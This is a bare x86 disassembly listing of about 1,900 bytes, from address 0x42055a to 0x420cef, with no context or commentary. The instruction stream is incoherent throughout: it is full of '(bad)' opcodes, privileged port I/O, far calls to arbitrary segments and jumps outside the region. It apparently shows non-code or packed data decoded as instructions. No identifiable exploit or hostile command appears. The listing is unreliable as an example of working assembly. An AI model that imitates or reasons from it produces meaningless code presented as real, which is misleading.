  42055a:	call   0x2c45:0x84f5fac2
  420561:	scas   eax,DWORD PTR es:[edi]
  420562:	cmp    al,0x50
  420564:	out    dx,eax
  420565:	mov    edi,0x884d0371
  42056a:	push   0x9e0a9280
  42056f:	sbb    dh,BYTE PTR [edx]
  420571:	cld    
  420572:	inc    esi
  420573:	sub    eax,0x9de4d564
  420578:	mov    BYTE PTR [eax-0x4c],ah
  42057b:	inc    edx
  42057c:	cmp    eax,0x63867082
  420581:	nop
  420582:	(bad)  
  420584:	sar    BYTE PTR [eax],0x68
  420587:	adc    al,bl
  420589:	mov    ecx,0xd803c2a7
  42058e:	inc    edx
  42058f:	sbb    eax,0xb583c851
  420594:	dec    esi
  420595:	sub    BYTE PTR [ecx],0xff
  420598:	in     al,dx
  420599:	loop   0x420543
  42059b:	xor    DWORD PTR [esi+0x7a],0xffffffcc
  42059f:	xchg   ebx,eax
  4205a0:	ret    
  4205a1:	fsub   st,st(4)
  4205a3:	enter  0xd725,0xcc
  4205a7:	jge    0x420570
  4205a9:	stos   DWORD PTR es:[edi],eax
  4205aa:	(bad)  
  4205ab:	cld    
  4205ac:	pop    esp
  4205ad:	add    ebx,DWORD PTR [ebp-0xe]
  4205b0:	icebp  
  4205b1:	mov    bh,0x48
  4205b3:	and    ch,BYTE PTR [eax-0x102a56eb]
  4205b9:	xor    al,0x97
  4205bb:	je     0x420602
  4205bd:	mov    bh,cl
  4205bf:	jp     0x4205b5
  4205c1:	push   edi
  4205c2:	(bad)  
  4205c3:	mov    eax,ds:0xf2552b5b
  4205c8:	ja     0x42062c
  4205ca:	push   esp
  4205cb:	in     eax,dx
  4205cc:	cmp    DWORD PTR [ebx-0x69d491e9],edx
  4205d2:	ins    DWORD PTR es:[edi],dx
  4205d3:	and    BYTE PTR [ecx+0x67638cdc],0xed
  4205da:	jns    0x420630
  4205dc:	inc    ebp
  4205dd:	test   eax,0xcde295cf
  4205e2:	or     ebp,DWORD PTR [ebx+0x37]
  4205e5:	fwait
  4205e6:	sti    
  4205e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4205e8:	sahf   
  4205e9:	cdq    
  4205ea:	scas   eax,DWORD PTR es:[edi]
  4205eb:	sub    BYTE PTR [edx],al
  4205ed:	mov    cl,BYTE PTR [ebx+0x35ec850b]
  4205f3:	jmp    0xeb4a1168
  4205f8:	sahf   
  4205f9:	inc    edx
  4205fa:	mov    ch,0x1
  4205fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4205fd:	je     0x4205cc
  4205ff:	dec    ecx
  420600:	ror    BYTE PTR [ebx+0x6dfbe8d8],cl
  420606:	jmp    0xd3b2a35
  42060b:	pop    eax
  42060c:	jmp    0x42059c
  42060e:	out    dx,al
  42060f:	lock (bad) 
  420611:	dec    edi
  420612:	or     eax,0x2e6bf027
  420617:	stos   BYTE PTR es:[edi],al
  420618:	push   esp
  420619:	pop    edx
  42061a:	cdq    
  42061b:	dec    edi
  42061c:	shr    BYTE PTR [esi-0x6176aa6a],cl
  420622:	loop   0x420669
  420624:	in     al,0x2c
  420626:	in     eax,dx
  420627:	mov    eax,ds:0x8ac34693
  42062c:	int3   
  42062d:	dec    ebp
  42062e:	xor    esi,0x8a2e0c56
  420634:	aas    
  420635:	inc    ebx
  420636:	push   es
  420637:	ins    BYTE PTR es:[edi],dx
  420638:	adc    eax,esi
  42063a:	jecxz  0x4205d2
  42063c:	cmp    al,0x1
  42063e:	dec    ebp
  42063f:	aad    0x83
  420641:	add    bl,BYTE PTR [ebp+0x1549270]
  420647:	stos   BYTE PTR es:[edi],al
  420648:	pop    eax
  420649:	adc    ebx,edi
  42064b:	mov    ds:0x81d07441,al
  420650:	pop    esi
  420651:	iret   
  420652:	xlat   BYTE PTR ds:[ebx]
  420653:	out    dx,al
  420654:	nop
  420655:	js     0x4206c3
  420657:	repnz nop
  420659:	mov    ds:0xb26edce,al
  42065e:	sbb    ebp,DWORD PTR [ebx]
  420660:	inc    ebp
  420661:	cwde   
  420662:	call   0xcbf63ab
  420667:	inc    bl
  420669:	(bad)  
  42066a:	stos   BYTE PTR es:[edi],al
  42066b:	xchg   edi,eax
  42066c:	mov    al,0x15
  42066e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42066f:	sub    DWORD PTR [edx],edx
  420671:	push   0xab1b43e
  420676:	fnsave ss:[edx]
  420679:	and    eax,DWORD PTR [ebx+0x3ca7287d]
  42067f:	in     al,0xc8
  420681:	loopne 0x4206dd
  420683:	scas   al,BYTE PTR es:[edi]
  420684:	pop    eax
  420685:	cmp    BYTE PTR [esi+0x21cc830d],ah
  42068b:	jbe    0x4206c4
  42068d:	repnz mov bh,0xb9
  420690:	rol    ah,1
  420692:	loope  0x42061f
  420694:	test   cl,ah
  420696:	aam    0x73
  420698:	in     al,0x24
  42069a:	addr16 fadd st(5),st
  42069d:	cli    
  42069e:	xlat   BYTE PTR ds:[ebx]
  42069f:	pop    esi
  4206a0:	inc    ebp
  4206a1:	inc    ebx
  4206a2:	xor    eax,0xe384e909
  4206a7:	mov    edx,DWORD PTR [ebx+edi*4+0x2032dd2f]
  4206ae:	xchg   esp,eax
  4206af:	jae    0x42066b
  4206b1:	dec    edx
  4206b2:	jno    0x420682
  4206b4:	jecxz  0x420688
  4206b6:	or     eax,0x85d12d9f
  4206bb:	adc    al,0xc0
  4206bd:	inc    esi
  4206be:	mov    bh,0xf3
  4206c0:	bswap  esp
  4206c2:	sti    
  4206c3:	inc    ebp
  4206c4:	dec    esi
  4206c6:	sub    ch,cl
  4206c8:	adc    al,0xb5
  4206ca:	pop    ebp
  4206cb:	mov    dh,0x56
  4206cd:	xchg   ebp,eax
  4206ce:	mov    esp,0xa1ed5e7c
  4206d3:	mov    bh,0x27
  4206d5:	cmp    al,0xb1
  4206d7:	inc    ebp
  4206d8:	sub    eax,0x5e07f24d
  4206dd:	pop    ebx
  4206de:	add    BYTE PTR [esi],al
  4206e0:	cmp    eax,0xd56d6572
  4206e5:	sti    
  4206e6:	xlat   BYTE PTR ds:[ebx]
  4206e7:	jo     0x4206e5
  4206e9:	int    0x89
  4206eb:	sahf   
  4206ec:	(bad)  
  4206ed:	loopne 0x4206bb
  4206ef:	and    DWORD PTR [edi-0x62],esi
  4206f2:	xchg   ebp,eax
  4206f3:	ror    DWORD PTR [ecx+0x1371ebcd],1
  4206f9:	sahf   
  4206fa:	sahf   
  4206fb:	shl    DWORD PTR [esi],cl
  4206fd:	ins    BYTE PTR es:[edi],dx
  4206fe:	push   eax
  4206ff:	leave  
  420700:	(bad)  
  420701:	aam    0xca
  420703:	xchg   edx,eax
  420704:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420705:	scas   al,BYTE PTR es:[edi]
  420706:	and    bh,BYTE PTR [edi]
  420708:	sbb    DWORD PTR [edx-0x6d1b3d4],ebp
  42070e:	jle    0x420699
  420710:	cmp    DWORD PTR [esi-0x2e],eax
  420713:	int3   
  420714:	add    al,0xb4
  420716:	cmc    
  420717:	mov    bh,0x8
  420719:	in     eax,0xcf
  42071b:	sahf   
  42071c:	js     0x4206ea
  42071e:	out    0x8a,eax
  420720:	xchg   ebp,eax
  420721:	jge    0x42071b
  420723:	scas   eax,DWORD PTR es:[edi]
  420724:	add    DWORD PTR [edi-0x74c3673d],0x91e3f770
  42072e:	es dec ebp
  420730:	jle    0x4206e6
  420732:	rcl    DWORD PTR [esp+edx*1-0xdb81b98],cl
  420739:	sub    BYTE PTR [esi-0x53bcbd58],dh
  42073f:	pop    ebx
  420740:	push   edx
  420741:	push   ebx
  420742:	std    
  420743:	shl    BYTE PTR [ecx],1
  420745:	pop    esp
  420746:	push   cs
  420747:	loopne 0x4207b7
  420749:	pop    esi
  42074a:	mov    ah,0xc6
  42074c:	mov    DWORD PTR [edx-0x12442d15],esi
  420752:	retf   
  420753:	push   esp
  420754:	mov    edi,0xbada4d32
  420759:	push   esi
  42075a:	outs   dx,DWORD PTR ds:[esi]
  42075b:	out    dx,al
  42075c:	pop    edi
  42075d:	mov    esi,0x700750d4
  420762:	mov    WORD PTR [ebp*2+0x38ec925c],ss
  420769:	mov    ch,0xeb
  42076b:	jmp    0xa47dd4ff
  420770:	pusha  
  420771:	push   DWORD PTR [edi]
  420773:	cmp    esp,DWORD PTR [ebp+0x704d88c0]
  420779:	ficom  WORD PTR [edi+0x65]
  42077c:	push   esi
  42077d:	not    eax
  42077f:	inc    edx
  420780:	mov    al,ds:0xfd5a9efa
  420785:	mov    edi,0xc82bd553
  42078a:	mov    edi,0xdc3a3aec
  42078f:	jmp    0xec41fa96
  420794:	xchg   ebp,eax
  420795:	pop    ss
  420796:	imul   al
  420798:	and    bh,ah
  42079a:	inc    eax
  42079b:	out    0x17,al
  42079d:	(bad)
  4207a0:	adc    DWORD PTR [ecx+0x1b],esp
  4207a3:	pop    ecx
  4207a4:	and    BYTE PTR [eax-0x23],0x7
  4207a8:	pop    ebx
  4207a9:	mov    ecx,0x9463e0d1
  4207ae:	mov    DWORD PTR [esi-0x3b],ebp
  4207b1:	imul   edx,DWORD PTR [ecx],0xffffffbb
  4207b4:	pushf  
  4207b5:	sbb    al,0xd7
  4207b7:	loop   0x42075a
  4207b9:	jbe    0x420788
  4207bb:	pop    eax
  4207bc:	js     0x420818
  4207be:	mov    ds:0x5e808c72,ax
  4207c4:	sbb    eax,0x7106f8dd
  4207c9:	pop    edx
  4207ca:	fistp  DWORD PTR [edi-0x4a043ab5]
  4207d0:	bound  ebx,QWORD PTR [ebp-0x34]
  4207d3:	or     edi,DWORD PTR [edx+0x6b]
  4207d6:	sbb    BYTE PTR [edi+0x799cd0c1],bh
  4207dc:	cmp    ecx,DWORD PTR [edi-0x73]
  4207df:	pop    eax
  4207e0:	and    ah,BYTE PTR [esi+0x479982ea]
  4207e6:	dec    edx
  4207e7:	jp     0x420842
  4207e9:	std    
  4207ea:	ins    BYTE PTR es:[edi],dx
  4207eb:	cmp    BYTE PTR [ecx],ch
  4207ed:	push   ebp
  4207ee:	sahf   
  4207ef:	mov    DWORD PTR [edi-0x1],esi
  4207f2:	imul   edx,DWORD PTR ds:0x5b391555,0x36
  4207f9:	and    esp,edx
  4207fb:	lea    esp,[edx-0x7b]
  4207fe:	adc    al,0x34
  420800:	and    eax,0xc399b49e
  420805:	mov    dl,0xe7
  420807:	out    0x67,al
  420809:	sub    eax,0x17
  42080c:	outs   dx,BYTE PTR ds:[esi]
  42080d:	and    al,BYTE PTR [esi-0xdca4ad0]
  420813:	cmp    bh,bh
  420815:	pop    ds
  420816:	lods   al,BYTE PTR ds:[esi]
  420817:	jl     0x420841
  420819:	aaa    
  42081a:	sbb    ebp,DWORD PTR ds:0x95b046d8
  420820:	mov    edi,0x9bff6574
  420825:	fldenv [eax+0x19]
  420828:	bound  ebp,QWORD PTR [eax]
  42082a:	pushf  
  42082b:	lods   eax,DWORD PTR ds:[esi]
  42082c:	push   ds
  42082d:	mov    esi,0x3abfc969
  420832:	sbb    eax,0x8feabfe4
  420837:	sbb    eax,0x461a1ee5
  42083c:	cld    
  42083d:	push   es
  42083e:	test   ah,dl
  420840:	js     0x4207ff
  420842:	mov    ds:0x58c890a2,eax
  420847:	test   dh,cl
  420849:	imul   edx,DWORD PTR [esi+0x12],0x55bf5b55
  420850:	pop    eax
  420851:	loope  0x420837
  420853:	cli    
  420854:	cmp    eax,0x160339ec
  420859:	lods   al,BYTE PTR ds:[esi]
  42085a:	ins    BYTE PTR es:[edi],dx
  42085b:	out    dx,eax
  42085c:	loope  0x420869
  42085e:	dec    esp
  42085f:	or     eax,DWORD PTR [eax]
  420861:	inc    edx
  420862:	pushf  
  420863:	out    0xa7,eax
  420865:	outs   dx,BYTE PTR ds:[esi]
  420866:	and    bh,BYTE PTR [eax+0x59]
  420869:	push   ebp
  42086a:	(bad)  
  42086d:	shl    cl,0x8d
  420870:	mov    al,ds:0xb6661295
  420875:	inc    edx
  420876:	shr    BYTE PTR [bx+si+0x31e],cl
  42087b:	nop    edi
  42087e:	(bad)  
  42087f:	jmp    DWORD PTR [ebp+0x72]
  420882:	fdivr  st(5),st
  420884:	in     al,dx
  420885:	neg    BYTE PTR [ebp+0x13c0b526]
  42088b:	dec    edx
  42088c:	pop    ds
  42088d:	pop    ss
  42088e:	mov    dl,BYTE PTR ds:0x4eb643bd
  420894:	jl     0x42086e
  420896:	xor    al,0xac
  420898:	sub    eax,0xb5f6a3ce
  42089d:	inc    ecx
  42089e:	add    eax,0xb7a26b3b
  4208a3:	shl    BYTE PTR [ebx+edx*4+0x79],1
  4208a7:	aaa    
  4208a8:	fistp  WORD PTR es:[eax-0x7579305e]
  4208af:	mov    DWORD PTR [ebx],ebp
  4208b1:	pop    ebp
  4208b2:	mul    DWORD PTR [ebx]
  4208b4:	cwde   
  4208b5:	xchg   ecx,eax
  4208b6:	inc    edx
  4208b7:	xchg   esp,eax
  4208b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4208b9:	cwde   
  4208ba:	icebp  
  4208bb:	(bad)  
  4208bc:	jg     0x4208bf
  4208be:	xorps  xmm0,XMMWORD PTR [ebx-0x27]
  4208c2:	out    dx,al
  4208c3:	bound  esp,QWORD PTR [ebx+esi*1-0x7af58a04]
  4208ca:	mov    ch,0x3c
  4208cc:	add    BYTE PTR [eax+0x7258cacd],0x64
  4208d3:	ret    
  4208d4:	or     eax,0x1578a386
  4208d9:	jo     0x420911
  4208db:	stos   DWORD PTR es:[edi],eax
  4208dc:	ret    
  4208dd:	fmul   DWORD PTR [esi-0x7c482e6]
  4208e3:	push   edx
  4208e4:	ja     0x42095e
  4208e6:	pop    edx
  4208e7:	mov    dh,0x57
  4208e9:	data16 fbld TBYTE PTR [esi]
  4208ec:	cmp    BYTE PTR [edx],dh
  4208ee:	pop    ecx
  4208ef:	or     edi,DWORD PTR [ebp+0x79]
  4208f2:	xchg   esp,edi
  4208f4:	jmp    0x420883
  4208f6:	cli    
  4208f7:	outs   dx,BYTE PTR ds:[esi]
  4208f8:	lods   eax,DWORD PTR ds:[esi]
  4208f9:	mov    ch,0xf0
  4208fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4208fc:	popa   
  4208fd:	xchg   esi,eax
  4208fe:	or     esi,DWORD PTR [ebp+0x53]
  420901:	cs pushf 
  420903:	int3   
  420904:	icebp  
  420905:	aaa    
  420906:	and    ebx,DWORD PTR [ebx-0x50]
  420909:	xor    ebp,edi
  42090b:	sbb    BYTE PTR [ebp-0x7d62120b],bl
  420911:	dec    edi
  420912:	bnd gs je 0x420937
  420916:	cwde   
  420917:	call   0x4974:0x2445ba34
  42091e:	sub    DWORD PTR [esi+ebp*4+0x48],ebp
  420922:	enter  0x96ee,0x2b
  420926:	xchg   esi,eax
  420927:	fwait
  420928:	cld    
  420929:	pop    edi
  42092a:	packsswb mm2,QWORD PTR [ebx-0x79]
  42092e:	pop    ebp
  42092f:	pop    ebx
  420930:	mov    dh,0x43
  420932:	rol    BYTE PTR [ebx-0x3a298cb2],0xec
  420939:	mov    dh,0x9e
  42093b:	cs jne 0x4208c4
  42093e:	stos   BYTE PTR es:[edi],al
  42093f:	adc    esp,edi
  420941:	jo     0x4209a3
  420943:	lds    esp,FWORD PTR [ecx]
  420945:	xchg   ebx,eax
  420946:	add    dl,BYTE PTR [ecx+0x51]
  420949:	push   cs
  42094a:	or     edx,ebp
  42094c:	popa   
  42094d:	xchg   ebx,eax
  42094e:	hlt    
  42094f:	shl    dl,1
  420951:	mov    cl,0x7d
  420953:	cmp    DWORD PTR [edx+edx*2+0x71],0xffffff91
  420958:	hlt    
  420959:	inc    esi
  42095a:	jecxz  0x42091f
  42095c:	cmp    ebx,DWORD PTR [ebx-0x24]
  42095f:	mov    dl,BYTE PTR [ebp+0x59]
  420962:	gs xor bl,bl
  420965:	or     al,0x71
  420967:	xor    dl,al
  420969:	push   ds
  42096a:	call   0xe186:0x4435ce7d
  420971:	pop    es
  420972:	or     BYTE PTR [esi],0x2c
  420975:	xchg   BYTE PTR [ebp-0x2c],ch
  420978:	mov    cl,0x69
  42097a:	fsubr  DWORD PTR [edi-0x3d5ba19e]
  420980:	lea    esp,[edx-0x2aff1611]
  420986:	pop    es
  420987:	jp     0x420926
  420989:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42098a:	int    0x9
  42098c:	(bad)  
  42098d:	(bad)  
  42098e:	(bad)  
  42098f:	ficomp DWORD PTR [ecx]
  420991:	or     BYTE PTR [ebx+edx*4-0x38bbb452],0x4f
  420999:	repz adc al,0x79
  42099c:	std    
  42099d:	pop    ss
  42099e:	aad    0xe9
  4209a0:	aas    
  4209a1:	loope  0x4209be
  4209a3:	fdivp  st(4),st
  4209a5:	xchg   DWORD PTR [esi],ecx
  4209a7:	mov    al,0x71
  4209a9:	(bad)  
  4209aa:	ss pop esp
  4209ac:	pop    ebp
  4209ad:	xlat   BYTE PTR ds:[ebx]
  4209ae:	jg     0x4209e5
  4209b0:	retf   
  4209b1:	data16 mov bh,0xe4
  4209b4:	push   edx
  4209b5:	mov    esp,0x48d481e5
  4209ba:	xchg   esi,eax
  4209bb:	mov    bh,0xcc
  4209bd:	pop    edi
  4209bf:	push   cs
  4209c0:	adc    al,0xd7
  4209c2:	push   cs
  4209c3:	inc    esi
  4209c4:	pop    esp
  4209c5:	sub    al,0xf2
  4209c7:	pop    es
  4209c8:	mov    esp,0x775f50a5
  4209cd:	jl     0x4209dc
  4209cf:	mov    ah,0x3a
  4209d1:	inc    edi
  4209d2:	or     DWORD PTR [ebx+esi*4-0x14975431],0xe31550cf
  4209dd:	fsubp  st(7),st
  4209df:	mov    dh,0x4b
  4209e1:	pop    esp
  4209e2:	pop    eax
  4209e3:	aas    
  4209e4:	in     eax,dx
  4209e5:	fisubr WORD PTR [esi-0x3d]
  4209e8:	icebp  
  4209e9:	xor    al,0x76
  4209eb:	dec    eax
  4209ec:	or     eax,0xca7526b1
  4209f1:	inc    eax
  4209f2:	rcl    DWORD PTR [edx],cl
  4209f4:	xor    BYTE PTR [edx+0x1323fb99],0xdd
  4209fb:	xchg   esp,eax
  4209fc:	push   ebx
  4209fd:	loope  0x4209f5
  4209ff:	push   ebp
  420a00:	nop
  420a01:	loopne 0x420a18
  420a03:	mov    cs,WORD PTR [ebp+eax*4+0x6a77072f]
  420a0a:	mov    esi,0x83672a24
  420a0f:	dec    ecx
  420a10:	test   ch,bl
  420a12:	sbb    DWORD PTR [edx+0x17],esi
  420a15:	aam    0x5f
  420a17:	scas   eax,DWORD PTR es:[edi]
  420a18:	gs repz es mov eax,ebp
  420a1d:	xchg   ecx,eax
  420a1e:	xchg   ebp,eax
  420a1f:	and    esi,DWORD PTR [ebx]
  420a21:	jbe    0x420a00
  420a23:	dec    esi
  420a24:	out    dx,eax
  420a25:	popf   
  420a26:	mov    BYTE PTR [ebp+0x33d1eaa2],cl
  420a2c:	fnsave [ecx+0x6c142515]
  420a32:	sbb    al,0x33
  420a34:	repz ror DWORD PTR [ebp-0x51],0xe
  420a39:	jno    0x420a90
  420a3b:	pop    ss
  420a3c:	add    edi,DWORD PTR [eax]
  420a3e:	jecxz  0x420a8f
  420a40:	scas   eax,DWORD PTR es:[edi]
  420a41:	das    
  420a42:	jno    0x420a72
  420a44:	cmc    
  420a45:	cld    
  420a46:	cs loop 0x420a35
  420a49:	sub    BYTE PTR [ebx+0x5a],0x4f
  420a4d:	pop    edx
  420a4e:	jns    0x420ac9
  420a50:	js     0x4209f3
  420a52:	shr    dh,cl
  420a54:	cmp    al,dl
  420a56:	jmp    0x420a46
  420a58:	xchg   ebp,eax
  420a59:	mov    cs,esp
  420a5b:	jo     0x4209e4
  420a5d:	jns    0x420a4a
  420a5f:	sub    DWORD PTR [ecx+0x1de35a6e],eax
  420a65:	cmc    
  420a66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420a67:	jp     0x420aad
  420a69:	call   0x4b5b:0x1deb95b4
  420a70:	mov    cl,0xdc
  420a72:	ins    BYTE PTR es:[edi],dx
  420a73:	(bad)  
  420a74:	fcmovbe st,st(6)
  420a76:	push   ebx
  420a77:	retf   0x2564
  420a7a:	lods   al,BYTE PTR ds:[esi]
  420a7b:	add    al,dh
  420a7d:	adc    al,0x98
  420a7f:	fsub   DWORD PTR [esi-0x4c26871c]
  420a85:	mov    ds:0x2a48bbcc,al
  420a8a:	imul   esi
  420a8c:	out    0x2c,eax
  420a8e:	lds    ecx,FWORD PTR [ebx]
  420a90:	cs push edi
  420a92:	adc    dh,BYTE PTR [eax-0x7cbd6c7]
  420a98:	dec    edi
  420a99:	in     eax,0x73
  420a9b:	jmp    0x62c9:0x4d50b1ee
  420aa2:	sbb    al,0xf4
  420aa4:	test   dl,ah
  420aa6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420aa7:	push   ds
  420aa8:	cmp    al,0x2
  420aaa:	pop    esi
  420aab:	fwait
  420aac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420aad:	je     0x420abe
  420aaf:	sub    ch,BYTE PTR [edi]
  420ab1:	lock les ebx,FWORD PTR cs:[ebx+0x16]
  420ab6:	scas   eax,DWORD PTR es:[edi]
  420ab7:	or     ebp,ebx
  420ab9:	adc    ch,BYTE PTR [ecx+0x65]
  420abc:	addr16 jmp esp
  420abf:	xor    BYTE PTR [ecx+0x64ca89],dl
  420ac5:	fs pop eax
  420ac7:	or     eax,0x9d82b540
  420acc:	ja     0x420a8b
  420ace:	imul   esi,DWORD PTR [esi-0x16],0xffffffff
  420ad2:	dec    BYTE PTR [edx+0x49]
  420ad5:	or     al,0xbf
  420ad7:	sbb    bl,BYTE PTR [edi]
  420ad9:	cmp    DWORD PTR [ebx+0x67],ebp
  420adc:	rcr    DWORD PTR [ebp-0x1faeb378],1
  420ae2:	xchg   ecx,eax
  420ae3:	mov    dh,0x1d
  420ae5:	mov    esp,0x26d15d7d
  420aea:	xchg   ebp,eax
  420aeb:	test   bl,bh
  420aed:	pop    es
  420aee:	adc    ch,BYTE PTR [edi]
  420af0:	mov    ch,0x75
  420af2:	shr    BYTE PTR [ebx-0x5c],1
  420af5:	fst    DWORD PTR [edi]
  420af7:	add    eax,0xb01272df
  420afc:	popa   
  420afd:	jb     0x420b0d
  420aff:	gs cld 
  420b01:	cmp    BYTE PTR [ebx],ah
  420b03:	sub    eax,0x594052c0
  420b08:	and    DWORD PTR [ebx-0x3d],ebp
  420b0b:	in     al,0x7e
  420b0d:	and    cl,BYTE PTR ds:0xc4bbd973
  420b13:	mov    edi,0x833bdd36
  420b18:	push   eax
  420b19:	retf   0x60aa
  420b1c:	loope  0x420b62
  420b1e:	pop    esp
  420b1f:	dec    esi
  420b20:	dec    edx
  420b21:	mov    edx,0xb6c960e5
  420b26:	hlt    
  420b27:	adc    ah,BYTE PTR [edi-0x18]
  420b2a:	test   DWORD PTR [eax+0x75f799b6],0xe1ed3bd6
  420b34:	std    
  420b35:	push   ebx
  420b36:	pop    ebx
  420b37:	inc    ebp
  420b38:	and    al,0xea
  420b3a:	add    al,0x6
  420b3c:	dec    DWORD PTR [ebx+0x7a]
  420b3f:	and    al,0x30
  420b41:	cwde   
  420b42:	adc    esp,DWORD PTR [edi-0x3c]
  420b45:	or     edx,ebp
  420b47:	(bad)  
  420b49:	pusha  
  420b4a:	lock cmp ecx,esi
  420b4d:	test   al,0x25
  420b4f:	cmp    ah,0xf7
  420b52:	xchg   ebx,eax
  420b53:	in     al,0x16
  420b55:	inc    edi
  420b56:	repz pop esp
  420b58:	aam    0x76
  420b5a:	aas    
  420b5b:	sub    BYTE PTR [esi+0x6ace95b8],cl
  420b61:	cmc    
  420b62:	push   edi
  420b63:	xor    ah,BYTE PTR [edx+0x60e7669b]
  420b69:	into   
  420b6a:	push   es
  420b6b:	leave  
  420b6c:	loopne 0x420aee
  420b6e:	popf   
  420b6f:	mov    bl,0x68
  420b71:	inc    edi
  420b72:	stc    
  420b73:	and    eax,0xa4ba7c80
  420b78:	scas   eax,DWORD PTR es:[edi]
  420b79:	sbb    bh,BYTE PTR [ebx-0xb]
  420b7c:	fsin   
  420b7e:	xor    ah,BYTE PTR [edi-0x53]
  420b81:	mov    esp,0xdeccbe9c
  420b86:	fcomp  QWORD PTR [esp+edx*8+0x4667faca]
  420b8d:	jno    0x420bf6
  420b8f:	mov    ebx,0x95d39b5f
  420b94:	rcr    DWORD PTR [eax-0x5e],0xf0
  420b98:	bnd jmp 0x420bb7
  420b9b:	or     edi,ebx
  420b9d:	jle    0x420b39
  420b9f:	dec    esi
  420ba0:	ret    0xe40d
  420ba3:	ror    DWORD PTR [ebx+0x440e8186],1
  420ba9:	pop    ss
  420baa:	adc    bh,BYTE PTR [ebp+0x107f295c]
  420bb0:	(bad)  
  420bb1:	scas   al,BYTE PTR es:[edi]
  420bb2:	dec    esp
  420bb3:	int    0xf9
  420bb5:	jo     0x420b4b
  420bb7:	js     0x420b54
  420bb9:	fs clc 
  420bbb:	ret    0x3b4
  420bbe:	out    0xba,al
  420bc0:	cmp    ebx,DWORD PTR [eax]
  420bc2:	cwde   
  420bc3:	pop    ebp
  420bc4:	push   ecx
  420bc5:	test   BYTE PTR [esi-0x3b],ch
  420bc8:	test   BYTE PTR [ebx+0x23ec7cd],ah
  420bce:	outs   dx,DWORD PTR ds:[esi]
  420bcf:	addr16 adc eax,0x8b2165a9
  420bd5:	pushf  
  420bd6:	outs   dx,BYTE PTR ds:[esi]
  420bd7:	mov    dh,0xeb
  420bd9:	xchg   ebp,eax
  420bda:	outs   dx,DWORD PTR ds:[esi]
  420bdb:	add    bl,BYTE PTR [ebx+0x78]
  420bde:	adc    ch,dl
  420be0:	add    eax,0x5c584dc8
  420be5:	retf   0xe91e
  420be8:	or     ebp,esi
  420bea:	retf   
  420beb:	clc    
  420bec:	xor    eax,0xf7e78732
  420bf1:	pop    edi
  420bf2:	repz hlt 
  420bf4:	pop    ebp
  420bf5:	jl     0x420c47
  420bf7:	or     eax,0xd3229ca9
  420bfc:	mov    eax,0xa56bbff7
  420c01:	je     0x420c59
  420c03:	adc    BYTE PTR [esi-0x8],ch
  420c06:	bound  ebx,QWORD PTR [ecx-0x9]
  420c09:	jns    0x420bbd
  420c0b:	mov    ah,0x6b
  420c0d:	or     al,0x5c
  420c0f:	fisubr WORD PTR [ebx]
  420c11:	adc    dl,BYTE PTR [edi+esi*8+0x1a]
  420c15:	inc    esp
  420c16:	and    al,0x26
  420c18:	ins    BYTE PTR es:[edi],dx
  420c19:	sub    al,0x67
  420c1b:	out    0xcf,al
  420c1d:	sub    bh,BYTE PTR ss:[edi]
  420c20:	push   edx
  420c21:	xchg   edi,eax
  420c22:	popf   
  420c23:	and    dh,bh
  420c25:	mov    ds:0xc4372c74,eax
  420c2a:	nop
  420c2b:	dec    esi
  420c2c:	cli    
  420c2d:	sar    BYTE PTR [edi+0x1ffc2fce],1
  420c33:	lock xor al,0x2e
  420c36:	cli    
  420c37:	repnz cmp eax,0x17c52d01
  420c3d:	arpl   WORD PTR [esi],bx
  420c3f:	sub    ebx,DWORD PTR [ebx+ebp*1]
  420c42:	mov    cl,0xc6
  420c44:	ficomp DWORD PTR [eax]
  420c46:	cmp    al,0x5c
  420c48:	and    eax,0xe9c0f320
  420c4d:	xchg   edi,eax
  420c4e:	add    eax,0xe9352576
  420c53:	jnp    0x97e45883
  420c59:	shr    DWORD PTR [esi+0x4788e169],cl
  420c5f:	mov    al,0x23
  420c61:	inc    eax
  420c62:	cdq    
  420c63:	adc    al,0x79
  420c65:	pop    ebx
  420c66:	sub    BYTE PTR [eax-0x5],cl
  420c69:	fs mov ch,0x79
  420c6c:	or     eax,0x891a4b90
  420c71:	les    edx,FWORD PTR [eax+0x3b]
  420c74:	int3   
  420c75:	sbb    dh,BYTE PTR ds:0x85fb144d
  420c7b:	popf   
  420c7c:	sub    BYTE PTR [edx],dh
  420c7e:	or     DWORD PTR [ecx],0xffffffa5
  420c81:	out    dx,eax
  420c82:	popf   
  420c83:	dec    edi
  420c85:	cld    
  420c86:	fnsave [edx-0xa]
  420c89:	fldenv [ebx+0x4fa1cb92]
  420c8f:	jp     0x420c51
  420c91:	xor    BYTE PTR [esp+ecx*1+0x17],dl
  420c95:	sti    
  420c96:	mov    DWORD PTR [ebx],edi
  420c98:	out    0xc,eax
  420c9a:	fisttp DWORD PTR [ebx-0x57]
  420c9d:	in     al,dx
  420c9e:	inc    eax
  420c9f:	inc    eax
  420ca0:	aaa    
  420ca1:	jnp    0x420c36
  420ca3:	push   eax
  420ca4:	test   eax,0xd9201eaa
  420ca9:	in     al,dx
  420caa:	addr16 out dx,al
  420cac:	rcl    BYTE PTR [ecx+ebx*1-0x2a],1
  420cb0:	fwait
  420cb1:	push   edi
  420cb2:	adc    esi,esp
  420cb4:	mov    cl,0x3e
  420cb6:	lahf   
  420cb7:	arpl   WORD PTR [edx],bx
  420cb9:	adc    al,0x59
  420cbb:	jmp    0xefd8:0x5ecf6050
  420cc2:	push   es
  420cc3:	cld    
  420cc4:	ins    DWORD PTR es:[edi],dx
  420cc5:	mov    eax,DWORD PTR [esi]
  420cc7:	out    0x50,al
  420cc9:	xchg   ecx,eax
  420cca:	jo     0x420d16
  420ccc:	cmp    ecx,ecx
  420cce:	cmp    BYTE PTR [ebx+0x3ee97b5e],ah
  420cd4:	push   es
  420cd5:	mov    DWORD PTR [esp+edx*1+0x77],0x34799ba7
  420cdd:	sub    eax,ebp
  420cdf:	adc    esi,esp
  420ce1:	jo     0x420c9e
  420ce3:	mov    eax,ds:0x8b2587ee
  420ce8:	fwait
  420ce9:	(bad)
  420cec:	ret    0xcc35
  420cef:	int    0x48
